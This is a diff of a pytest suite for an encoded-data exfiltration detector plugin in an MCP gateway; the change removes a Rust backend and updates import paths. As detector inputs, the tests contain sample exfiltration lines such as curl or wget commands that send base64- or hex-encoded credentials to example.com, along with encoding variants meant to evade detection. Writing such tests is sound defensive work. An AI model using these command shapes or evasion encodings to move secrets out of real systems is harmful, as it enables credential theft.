@@ -4,7 +4,6 @@
 # Standard
 import base64
 import logging
-import os
 
 # Third-Party
 from pydantic import ValidationError
@@ -22,7 +21,7 @@ from mcpgateway.plugins.framework import (
     ToolPostInvokePayload,
 )
 from mcpgateway.plugins.framework.hooks.resources import ResourceHookType
-from plugins.encoded_exfil_detection.encoded_exfil_detector import (
+from cpex_encoded_exfil_detection.encoded_exfil_detection import (
     _decode_candidate,
     _has_egress_context,
     _normalize_padding,
@@ -33,110 +32,91 @@ from plugins.encoded_exfil_detection.encoded_exfil_detector import (
     EncodedExfilDetectorPlugin,
 )
 
-# Optional Rust extension
-try:
-    # Third-Party
-    from encoded_exfil_detection_rust.encoded_exfil_detection_rust import py_scan_container as encoded_exfil_detection_rust  # noqa: F401
 
-    RUST_AVAILABLE = True
-except ImportError:
-    RUST_AVAILABLE = False
-    # Fail in CI if Rust plugins are required
-    if os.environ.get("REQUIRE_RUST") == "1":
-        raise ImportError("Rust plugin 'encoded_exfil_detection' is required in CI but not available")
-
-
-@pytest.mark.parametrize(
-    "use_rust",
-    [
-        pytest.param(False, id="python"),
-        pytest.param(True, marks=pytest.mark.skipif(not RUST_AVAILABLE, reason="Rust not available"), id="rust"),
-    ],
-)
 class TestEncodedDetectionScan:
-    """Validate scanner behavior in Python and optional Rust modes."""
+    """Validate scanner behavior for the packaged detector."""
 
-    def test_detects_base64_sensitive_payload(self, use_rust: bool):
+    def test_detects_base64_sensitive_payload(self):
         cfg = EncodedExfilDetectorConfig()
         encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
         payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
 
         assert count >= 1
         assert any(f.get("encoding") in {"base64", "base64url"} for f in findings)
 
-    def test_detects_hex_payload(self, use_rust: bool):
+    def test_detects_hex_payload(self):
         cfg = EncodedExfilDetectorConfig()
         encoded_hex = b"password=secret-value-for-upload".hex()
         payload = {"blob": f"POST /collect data={encoded_hex}"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
 
         assert count >= 1
         assert any(f.get("encoding") == "hex" for f in findings)
 
-    def test_redacts_when_enabled(self, use_rust: bool):
+    def test_redacts_when_enabled(self):
         cfg = EncodedExfilDetectorConfig(redact=True, redaction_text="[ENCODED]", block_on_detection=False)
         encoded = base64.b64encode(b"api_key=secret-token-value").decode()
 
-        count, redacted, findings = _scan_container({"value": encoded}, cfg, use_rust=use_rust)
+        count, redacted, findings = _scan_container({"value": encoded}, cfg)
 
         assert count >= 1
         assert len(findings) >= 1
         assert redacted["value"] == "[ENCODED]"
 
-    def test_clean_input_no_findings(self, use_rust: bool):
+    def test_clean_input_no_findings(self):
         cfg = EncodedExfilDetectorConfig()
         payload = {"message": "normal conversational text without encoded payloads"}
 
-        count, redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, redacted, findings = _scan_container(payload, cfg)
 
         assert count == 0
         assert findings == []
         assert redacted == payload
 
-    def test_base64_with_word_boundaries(self, use_rust: bool):
+    def test_base64_with_word_boundaries(self):
         """Test that base64 patterns correctly match at word boundaries."""
         cfg = EncodedExfilDetectorConfig()
 
         # Should detect: base64 with spaces around it
         encoded = base64.b64encode(b"authorization: bearer secret-token-value").decode()
         payload1 = {"text": f"data {encoded} end"}
-        count1, _, findings1 = _scan_container(payload1, cfg, use_rust=use_rust)
+        count1, _, findings1 = _scan_container(payload1, cfg)
         assert count1 >= 1, "Should detect base64 with spaces"
 
         # Should detect: base64 at start of string
         payload2 = {"text": f"{encoded} followed by text"}
-        count2, _, findings2 = _scan_container(payload2, cfg, use_rust=use_rust)
+        count2, _, findings2 = _scan_container(payload2, cfg)
         assert count2 >= 1, "Should detect base64 at start"
 
         # Should detect: base64 at end of string
         payload3 = {"text": f"text followed by {encoded}"}
-        count3, _, findings3 = _scan_container(payload3, cfg, use_rust=use_rust)
+        count3, _, findings3 = _scan_container(payload3, cfg)
         assert count3 >= 1, "Should detect base64 at end"
 
         # Should detect: base64 with punctuation boundaries
         payload4 = {"text": f"curl -d '{encoded}' https://example.com"}
-        count4, _, findings4 = _scan_container(payload4, cfg, use_rust=use_rust)
+        count4, _, findings4 = _scan_container(payload4, cfg)
         assert count4 >= 1, "Should detect base64 with punctuation"
 
-    def test_hex_with_word_boundaries(self, use_rust: bool):
+    def test_hex_with_word_boundaries(self):
         """Test that hex patterns correctly match at word boundaries."""
         cfg = EncodedExfilDetectorConfig()
 
         # Should detect: hex with spaces
         hex_data = b"password=secret-value-for-upload".hex()
         payload1 = {"text": f"data {hex_data} end"}
-        count1, _, findings1 = _scan_container(payload1, cfg, use_rust=use_rust)
+        count1, _, findings1 = _scan_container(payload1, cfg)
         assert count1 >= 1, "Should detect hex with spaces"
 
         # Should detect: hex with punctuation
         payload2 = {"text": f"POST /collect data={hex_data}"}
-        count2, _, findings2 = _scan_container(payload2, cfg, use_rust=use_rust)
+        count2, _, findings2 = _scan_container(payload2, cfg)
         assert count2 >= 1, "Should detect hex with punctuation"
 
-    def test_no_false_positives_in_urls(self, use_rust: bool):
+    def test_no_false_positives_in_urls(self):
         """Test that we don't falsely detect base64-like patterns in URLs."""
         cfg = EncodedExfilDetectorConfig()
 
@@ -144,22 +124,22 @@ class TestEncodedDetectionScan:
         # and don't decode to sensitive content
         payload = {"url": "https://example.com/path/to/resource", "message": "Visit our website at https://example.com"}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         # Should have 0 findings since these are normal URLs without sensitive encoded data
         assert count == 0, "Should not detect normal URLs as encoded exfil"
 
-    def test_concatenated_alphanumeric_not_detected(self, use_rust: bool):
+    def test_concatenated_alphanumeric_not_detected(self):
         """Test that long alphanumeric strings that aren't valid encodings don't trigger."""
         cfg = EncodedExfilDetectorConfig()
 
         # Long alphanumeric string that's not valid base64/hex
         payload = {"id": "user123456789abcdefghijklmnopqrstuvwxyz"}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         # Should not detect since it won't decode properly or meet suspicion criteria
         assert count == 0, "Should not detect random alphanumeric strings"
 
-    def test_base64url_detection(self, use_rust: bool):
+    def test_base64url_detection(self):
         """Test base64url encoding detection (uses - and _ instead of + and /)."""
         cfg = EncodedExfilDetectorConfig()
 
@@ -170,11 +150,11 @@ class TestEncodedDetectionScan:
         encoded = base64.urlsafe_b64encode(b"api_key=secret-token-value-here").decode()
         payload = {"data": f"token={encoded}"}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         assert count >= 1, "Should detect base64url encoding"
         assert any(f.get("encoding") in {"base64", "base64url"} for f in findings)
 
-    def test_percent_encoding_detection(self, use_rust: bool):
+    def test_percent_encoding_detection(self):
         """Test percent-encoded data detection."""
         cfg = EncodedExfilDetectorConfig()
 
@@ -183,11 +163,11 @@ class TestEncodedDetectionScan:
         percent_encoded = "".join(f"%{ord(c):02x}" for c in text)
         payload = {"data": f"send {percent_encoded} to server"}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         assert count >= 1, "Should detect percent encoding"
         assert any(f.get("encoding") == "percent_encoding" for f in findings)
 
-    def test_escaped_hex_detection(self, use_rust: bool):
+    def test_escaped_hex_detection(self):
         """Test escaped hex (\\xNN) detection."""
         cfg = EncodedExfilDetectorConfig()
 
@@ -196,7 +176,7 @@ class TestEncodedDetectionScan:
         escaped_hex = "".join(f"\\x{ord(c):02x}" for c in text)
         payload = {"data": f"payload {escaped_hex}"}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         assert count >= 1, "Should detect escaped hex"
         assert any(f.get("encoding") == "escaped_hex" for f in findings)
 
@@ -214,7 +194,7 @@ class TestEncodedExfilPluginHooks:
         return EncodedExfilDetectorPlugin(
             PluginConfig(
                 name="EncodedExfilDetector",
-                kind="plugins.encoded_exfil_detection.encoded_exfil_detector.EncodedExfilDetectorPlugin",
+                kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                 hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE],
                 config=config,
             )
@@ -357,7 +337,7 @@ class TestEncodedExfilHelpers:
     def test_scan_container_non_matching_type(self):
         """Non-str/dict/list containers pass through unchanged."""
         cfg = EncodedExfilDetectorConfig()
-        count, result, findings = _scan_container(42, cfg, use_rust=False)
+        count, result, findings = _scan_container(42, cfg)
         assert count == 0
         assert result == 42
         assert findings == []
@@ -366,19 +346,19 @@ class TestEncodedExfilHelpers:
         """Lists are recursively scanned."""
         cfg = EncodedExfilDetectorConfig()
         encoded = base64.b64encode(b"password=my-secret-value").decode()
-        count, result, findings = _scan_container([f"curl {encoded} webhook"], cfg, use_rust=False)
+        count, result, findings = _scan_container([f"curl {encoded} webhook"], cfg)
         assert count >= 1
 
     def test_printable_ratio_empty_data(self):
         # First-Party
-        from plugins.encoded_exfil_detection.encoded_exfil_detector import _printable_ratio
+        from cpex_encoded_exfil_detection.encoded_exfil_detection import _printable_ratio
 
         assert _printable_ratio(b"") == 0.0
 
     def test_evaluate_candidate_decoded_too_short(self):
         """Candidate decodes but result is shorter than min_decoded_length."""
         # First-Party
-        from plugins.encoded_exfil_detection.encoded_exfil_detector import _evaluate_candidate
+        from cpex_encoded_exfil_detection.encoded_exfil_detection import _evaluate_candidate
 
         cfg = EncodedExfilDetectorConfig(min_decoded_length=100, min_encoded_length=8)
         # Candidate is long enough to pass min_encoded_length but decodes to < 100 bytes
@@ -452,37 +432,30 @@ class TestConfigValidation:
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "use_rust",
-    [
-        pytest.param(False, id="python"),
-        pytest.param(True, marks=pytest.mark.skipif(not RUST_AVAILABLE, reason="Rust not available"), id="rust"),
-    ],
-)
 class TestAllowlisting:
     """Verify allowlist_patterns configuration skips known-good encoded strings."""
 
-    def test_allowlisted_base64_pattern_not_flagged(self, use_rust: bool):
+    def test_allowlisted_base64_pattern_not_flagged(self):
         """A base64 string matching an allowlist regex should not produce findings."""
         # Encode a known-good value that would normally trigger detection
         allowed_value = base64.b64encode(b"authorization: bearer allowed-token-value").decode()
         cfg = EncodedExfilDetectorConfig(allowlist_patterns=[allowed_value[:16] + ".*"])
         payload = {"body": f"curl -d '{allowed_value}' https://example.com/hook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count == 0, "Allowlisted pattern should not produce findings"
 
-    def test_non_allowlisted_base64_still_flagged(self, use_rust: bool):
+    def test_non_allowlisted_base64_still_flagged(self):
         """Allowlisting one pattern should not suppress detection of others."""
         allowed = base64.b64encode(b"authorization: bearer allowed-token-value").decode()
         flagged = base64.b64encode(b"password=super-secret-credential-value").decode()
         cfg = EncodedExfilDetectorConfig(allowlist_patterns=[allowed[:16] + ".*"])
         payload = {"body": f"curl -d '{flagged}' https://example.com/hook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1, "Non-allowlisted pattern should still be flagged"
 
-    def test_invalid_allowlist_regex_rejected_at_init(self, use_rust: bool):
+    def test_invalid_allowlist_regex_rejected_at_init(self):
         """An invalid regex in allowlist_patterns should raise at config or plugin init."""
         with pytest.raises((ValidationError, Exception)):
             EncodedExfilDetectorConfig(allowlist_patterns=["[invalid"])
@@ -490,29 +463,29 @@ class TestAllowlisting:
             EncodedExfilDetectorPlugin(
                 PluginConfig(
                     name="EncodedExfilDetector",
-                    kind="plugins.encoded_exfil_detection.encoded_exfil_detector.EncodedExfilDetectorPlugin",
+                    kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                     hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE],
                     config={"allowlist_patterns": ["[invalid"]},
                 )
             )
 
-    def test_allowlist_empty_has_no_effect(self, use_rust: bool):
+    def test_allowlist_empty_has_no_effect(self):
         """Empty allowlist should not suppress any detections."""
         cfg = EncodedExfilDetectorConfig(allowlist_patterns=[])
         encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
         payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1
 
-    def test_allowlist_partial_match_suppresses(self, use_rust: bool):
+    def test_allowlist_partial_match_suppresses(self):
         """An allowlist pattern that partially matches a candidate should suppress it."""
         encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
         # Pattern matches a substring of the encoded candidate
         cfg = EncodedExfilDetectorConfig(allowlist_patterns=[encoded[:12]])
         payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count == 0, "Partial allowlist match should suppress the candidate"
 
 
@@ -521,17 +494,10 @@ class TestAllowlisting:
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "use_rust",
-    [
-        pytest.param(False, id="python"),
-        pytest.param(True, marks=pytest.mark.skipif(not RUST_AVAILABLE, reason="Rust not available"), id="rust"),
-    ],
-)
 class TestConfigurableKeywords:
     """Verify extra_sensitive_keywords and extra_egress_hints are merged with defaults."""
 
-    def test_extra_sensitive_keyword_triggers_detection(self, use_rust: bool):
+    def test_extra_sensitive_keyword_triggers_detection(self):
         """A custom sensitive keyword (not in defaults) should boost the suspicion score."""
         # Use a keyword NOT in the built-in _SENSITIVE_KEYWORDS list
         # "watsonx_cred" is custom; the payload contains no built-in keywords
@@ -542,12 +508,12 @@ class TestConfigurableKeywords:
         )
         payload = {"data": encoded}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1
         # The custom keyword "watsonx_cred" should trigger sensitive_keywords scoring
         assert any("sensitive_keywords" in f.get("reason", []) for f in findings)
 
-    def test_extra_egress_hint_triggers_detection(self, use_rust: bool):
+    def test_extra_egress_hint_triggers_detection(self):
         """A custom egress hint (not in defaults) should boost the suspicion score."""
         # Use "mq_publish" which is NOT in the built-in _EGRESS_HINTS list
         # Avoid ALL built-in hints: curl, wget, http://, https://, upload, webhook,
@@ -560,11 +526,11 @@ class TestConfigurableKeywords:
         # Context only contains the custom hint "mq_publish", no built-in hints
         payload = {"data": f"mq_publish {encoded} to_queue"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1
         assert any("egress_context" in f.get("reason", []) for f in findings)
 
-    def test_default_keywords_still_work_with_extras(self, use_rust: bool):
+    def test_default_keywords_still_work_with_extras(self):
         """Adding custom keywords should not remove the built-in ones."""
         encoded = base64.b64encode(b"password=super-secret-credential-value").decode()
         cfg = EncodedExfilDetectorConfig(
@@ -573,11 +539,11 @@ class TestConfigurableKeywords:
         )
         payload = {"data": f"curl {encoded} webhook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1
         assert any("sensitive_keywords" in f.get("reason", []) for f in findings)
 
-    def test_mixed_case_extra_keyword_matches(self, use_rust: bool):
+    def test_mixed_case_extra_keyword_matches(self):
         """Extra sensitive keywords with mixed case must still match (case-insensitive)."""
         encoded = base64.b64encode(b"WatsonX_Cred=xq7m9Rk2vLpN3wJfHbYd8sTc").decode()
         cfg = EncodedExfilDetectorConfig(
@@ -586,11 +552,11 @@ class TestConfigurableKeywords:
         )
         payload = {"data": encoded}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1
         assert any("sensitive_keywords" in f.get("reason", []) for f in findings), "Mixed-case extra keyword should match case-insensitively"
 
-    def test_mixed_case_extra_egress_hint_matches(self, use_rust: bool):
+    def test_mixed_case_extra_egress_hint_matches(self):
         """Extra egress hints with mixed case must still match (case-insensitive)."""
         encoded = base64.b64encode(b"datafile=xq7m9Rk2vLpN3wJfHbYd8sTcMn").decode()
         cfg = EncodedExfilDetectorConfig(
@@ -599,7 +565,7 @@ class TestConfigurableKeywords:
         )
         payload = {"data": f"mq_publish {encoded} to_queue"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1
         assert any("egress_context" in f.get("reason", []) for f in findings), "Mixed-case extra egress hint should match case-insensitively"
 
@@ -622,7 +588,7 @@ class TestResourcePostFetchHook:
         return EncodedExfilDetectorPlugin(
             PluginConfig(
                 name="EncodedExfilDetector",
-                kind="plugins.encoded_exfil_detection.encoded_exfil_detector.EncodedExfilDetectorPlugin",
+                kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                 hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE, ResourceHookType.RESOURCE_POST_FETCH],
                 config=config,
             )
@@ -683,7 +649,7 @@ class TestFunctionalityGaps:
         return EncodedExfilDetectorPlugin(
             PluginConfig(
                 name="EncodedExfilDetector",
-                kind="plugins.encoded_exfil_detection.encoded_exfil_detector.EncodedExfilDetectorPlugin",
+                kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                 hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE],
                 config=config,
             )
@@ -763,17 +729,10 @@ class TestFunctionalityGaps:
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "use_rust",
-    [
-        pytest.param(False, id="python"),
-        pytest.param(True, marks=pytest.mark.skipif(not RUST_AVAILABLE, reason="Rust not available"), id="rust"),
-    ],
-)
 class TestBypassResistance:
     """Verify detection cannot be trivially bypassed."""
 
-    def test_mixed_case_hex_detected(self, use_rust: bool):
+    def test_mixed_case_hex_detected(self):
         """Hex with alternating case should still be detected."""
         cfg = EncodedExfilDetectorConfig()
         # Encode with mixed case
@@ -782,11 +741,11 @@ class TestBypassResistance:
         mixed = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(hex_str))
         payload = {"blob": f"POST /collect data={mixed}"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1, "Mixed-case hex should still be detected"
         assert any(f.get("encoding") == "hex" for f in findings)
 
-    def test_exactly_at_min_encoded_length_detected(self, use_rust: bool):
+    def test_exactly_at_min_encoded_length_detected(self):
         """A candidate exactly at min_encoded_length should be evaluated (not skipped)."""
         min_len = 24
         cfg = EncodedExfilDetectorConfig(min_encoded_length=min_len, min_suspicion_score=1, min_decoded_length=4)
@@ -796,10 +755,10 @@ class TestBypassResistance:
         assert len(hex_str) == min_len
         payload = {"data": f"curl {hex_str} webhook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1, f"Candidate at exactly min_encoded_length ({min_len}) should be evaluated"
 
-    def test_one_below_min_encoded_length_not_detected(self, use_rust: bool):
+    def test_one_below_min_encoded_length_not_detected(self):
         """A candidate one below min_encoded_length should be skipped."""
         min_len = 24
         cfg = EncodedExfilDetectorConfig(min_encoded_length=min_len, min_suspicion_score=1)
@@ -809,10 +768,10 @@ class TestBypassResistance:
         assert len(hex_str) < min_len
         payload = {"data": f"curl {hex_str} webhook"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count == 0, "Candidate below min_encoded_length should not be detected"
 
-    def test_padding_variations_base64(self, use_rust: bool):
+    def test_padding_variations_base64(self):
         """Base64 with various padding states should all be decoded and detected."""
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1)
 
@@ -823,10 +782,10 @@ class TestBypassResistance:
 
         for variant in [encoded_no_pad, encoded_padded]:
             payload = {"data": f"curl {variant} webhook"}
-            count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+            count, _redacted, findings = _scan_container(payload, cfg)
             assert count >= 1, f"Base64 variant '{variant[:20]}...' should be detected"
 
-    def test_encoded_payload_split_across_fields(self, use_rust: bool):
+    def test_encoded_payload_split_across_fields(self):
         """Each field should be scanned independently; suspicious fields detected."""
         cfg = EncodedExfilDetectorConfig()
         # Two independently suspicious encoded payloads in separate fields
@@ -834,13 +793,13 @@ class TestBypassResistance:
         seg2 = base64.b64encode(b"api_key=another-secret-credential-two").decode()
         payload = {"field1": f"curl {seg1} webhook", "field2": f"wget {seg2} upload"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 2, "Both fields with encoded payloads should produce findings"
         paths = [f.get("path", "") for f in findings]
         assert any("field1" in p for p in paths), "field1 should have findings"
         assert any("field2" in p for p in paths), "field2 should have findings"
 
-    def test_long_segment_scoring_bonus(self, use_rust: bool):
+    def test_long_segment_scoring_bonus(self):
         """A candidate >= 2x min_encoded_length should get 'long_segment' bonus."""
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1)
         # Create a long payload (well over 2x default 24)
@@ -849,7 +808,7 @@ class TestBypassResistance:
         assert len(encoded) >= 48  # 2x default min_encoded_length
         payload = {"data": encoded}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1
         assert any("long_segment" in f.get("reason", []) for f in findings), "Long segment should get scoring bonus"
 
@@ -895,7 +854,7 @@ class TestEdgeCases:
         hex_encoded = b"api_key=secret-value-for-upload".hex()
         payload = {"b64": f"curl {encoded} webhook", "hex": f"upload {hex_encoded}"}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=False)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count == 0
         assert findings == []
 
@@ -916,7 +875,7 @@ class TestEdgeCases:
         """Non-str/dict/list types (int, float, bool, None) should pass through unchanged."""
         cfg = EncodedExfilDetectorConfig()
         for value in [42, 3.14, True, None]:
-            count, result, findings = _scan_container(value, cfg, use_rust=False)
+            count, result, findings = _scan_container(value, cfg)
             assert count == 0
             assert result == value
             assert findings == []
@@ -931,7 +890,7 @@ class TestEdgeCases:
         deep_payload = {"level1": deep_payload}
         deep_payload = {"level0": deep_payload}
 
-        count, _result, findings = _scan_container(deep_payload, cfg, use_rust=False)
+        count, _result, findings = _scan_container(deep_payload, cfg)
         # The encoded payload at depth 4 should NOT be found because recursion stops at depth 2
         assert count == 0, "Scanning should stop at max_recursion_depth"
         assert findings == []
@@ -951,7 +910,7 @@ class TestErrorHandling:
             EncodedExfilDetectorPlugin(
                 PluginConfig(
                     name="EncodedExfilDetector",
-                    kind="plugins.encoded_exfil_detection.encoded_exfil_detector.EncodedExfilDetectorPlugin",
+                    kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                     hooks=[PromptHookType.PROMPT_PRE_FETCH],
                     config={"min_entropy": -5.0},
                 )
@@ -960,7 +919,7 @@ class TestErrorHandling:
     def test_scan_with_none_input_no_crash(self):
         """Scanning None should not crash."""
         cfg = EncodedExfilDetectorConfig()
-        count, result, findings = _scan_container(None, cfg, use_rust=False)
+        count, result, findings = _scan_container(None, cfg)
         assert count == 0
         assert result is None
         assert findings == []
@@ -972,8 +931,8 @@ class TestErrorHandling:
         encoded = base64.b64encode(f"password={secret}".encode()).decode()
         payload = {"data": f"curl {encoded} webhook"}
 
-        with caplog.at_level(logging.DEBUG, logger="plugins.encoded_exfil_detection.encoded_exfil_detector"):
-            _scan_container(payload, cfg, use_rust=False)
+        with caplog.at_level(logging.DEBUG, logger="cpex_encoded_exfil_detection.encoded_exfil_detection"):
+            _scan_container(payload, cfg)
 
         # The decoded secret should never appear in log output
         for record in caplog.records:
@@ -981,75 +940,14 @@ class TestErrorHandling:
 
 
 # ---------------------------------------------------------------------------
-# Group I — Rust/Python Parity
-# ---------------------------------------------------------------------------
-
-
-@pytest.mark.skipif(not RUST_AVAILABLE, reason="Rust not available")
-class TestRustPythonParity:
-    """Assert that Rust and Python paths produce identical results for the same input."""
-
-    def test_parity_base64_identical_count_and_scores(self):
-        """Same base64 input must produce identical count, scores, and encoding types."""
-        cfg = EncodedExfilDetectorConfig()
-        encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
-        payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}
-
-        count_py, _, findings_py = _scan_container(payload, cfg, use_rust=False)
-        count_rs, _, findings_rs = _scan_container(payload, cfg, use_rust=True)
-
-        assert count_py == count_rs, f"Count mismatch: Python={count_py}, Rust={count_rs}"
-        assert len(findings_py) == len(findings_rs), "Finding count mismatch"
-        for fp, fr in zip(findings_py, findings_rs):
-            assert fp["encoding"] == fr["encoding"], f"Encoding mismatch: {fp['encoding']} vs {fr['encoding']}"
-            assert fp["score"] == fr["score"], f"Score mismatch: {fp['score']} vs {fr['score']}"
-
-    def test_parity_hex_identical_redacted_output(self):
-        """Same hex input with redact=True must produce identical redacted strings."""
-        cfg = EncodedExfilDetectorConfig(redact=True, redaction_text="[PARITY_REDACTED]", block_on_detection=False)
-        encoded_hex = b"password=secret-value-for-upload".hex()
-        payload = {"blob": f"POST /collect data={encoded_hex}"}
-
-        _count_py, redacted_py, _findings_py = _scan_container(payload, cfg, use_rust=False)
-        _count_rs, redacted_rs, _findings_rs = _scan_container(payload, cfg, use_rust=True)
-
-        assert redacted_py == redacted_rs, f"Redacted output mismatch:\nPython: {redacted_py}\nRust: {redacted_rs}"
-
-    def test_parity_multi_encoding_identical_finding_order(self):
-        """Input with multiple encoding types must produce findings in same order with same fields."""
-        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1)
-        b64 = base64.b64encode(b"password=secret-token-value-here").decode()
-        hex_val = b"api_key=secret-value-for-upload!".hex()
-        payload = {"b64": f"curl {b64} webhook", "hex": f"upload {hex_val}"}
-
-        count_py, _, findings_py = _scan_container(payload, cfg, use_rust=False)
-        count_rs, _, findings_rs = _scan_container(payload, cfg, use_rust=True)
-
-        assert count_py == count_rs, f"Count mismatch: Python={count_py}, Rust={count_rs}"
-        assert len(findings_py) == len(findings_rs), "Finding count mismatch"
-        for fp, fr in zip(findings_py, findings_rs):
-            assert fp["encoding"] == fr["encoding"]
-            assert fp["path"] == fr["path"]
-            assert fp["score"] == fr["score"]
-            assert fp["decoded_len"] == fr["decoded_len"]
-
-
-# ---------------------------------------------------------------------------
 # Group K — Nested Encoding Detection
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "use_rust",
-    [
-        pytest.param(False, id="python"),
-        pytest.param(True, marks=pytest.mark.skipif(not RUST_AVAILABLE, reason="Rust not available"), id="rust"),
-    ],
-)
 class TestNestedEncodingDetection:
     """Verify detection of multi-layer encoded payloads."""
 
-    def test_double_encoded_base64_detected(self, use_rust: bool):
+    def test_double_encoded_base64_detected(self):
         """base64(base64(sensitive_data)) — inner sensitive keywords found after peeling two layers.
 
         The outer base64 decodes to another base64 string. That inner base64 decodes to
@@ -1063,11 +961,11 @@ class TestNestedEncodingDetection:
         cfg = EncodedExfilDetectorConfig(max_decode_depth=2, min_suspicion_score=4)
         payload = {"data": outer}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1, "Double-encoded base64 should be detected via nested decoding"
         assert any("sensitive_keywords" in f.get("reason", []) for f in findings), "sensitive_keywords should be found after peeling inner layer"
 
-    def test_nested_detection_respects_max_decode_depth(self, use_rust: bool):
+    def test_nested_detection_respects_max_decode_depth(self):
         """With max_decode_depth=1, nested layers beyond the first should NOT be peeled.
 
         Triple-encoded: base64(base64(base64("password=secret"))).
@@ -1080,11 +978,11 @@ class TestNestedEncodingDetection:
 
         # Shallow: depth=1 means no nested decoding (decode_depth 0 < 1-1=0 is false)
         cfg_shallow = EncodedExfilDetectorConfig(max_decode_depth=1, min_suspicion_score=4)
-        _count_shallow, _, findings_shallow = _scan_container({"data": level3}, cfg_shallow, use_rust=use_rust)
+        _count_shallow, _, findings_shallow = _scan_container({"data": level3}, cfg_shallow)
 
         # Deep: all layers peeled, sensitive_keywords found in innermost
         cfg_deep = EncodedExfilDetectorConfig(max_decode_depth=4, min_suspicion_score=4)
-        _count_deep, _, findings_deep = _scan_container({"data": level3}, cfg_deep, use_rust=use_rust)
+        _count_deep, _, findings_deep = _scan_container({"data": level3}, cfg_deep)
 
         # Deep decoding should find sensitive_keywords that shallow misses
         shallow_has_keywords = any("sensitive_keywords" in f.get("reason", []) for f in findings_shallow)
@@ -1092,7 +990,7 @@ class TestNestedEncodingDetection:
         assert deep_has_keywords, "Deep decode should find sensitive_keywords in innermost layer"
         assert not shallow_has_keywords, "Shallow decode should NOT find sensitive_keywords"
 
-    def test_hex_wrapped_base64_detected(self, use_rust: bool):
+    def test_hex_wrapped_base64_detected(self):
         """hex(base64(sensitive_data)) — the inner base64 with keywords found after peeling hex.
 
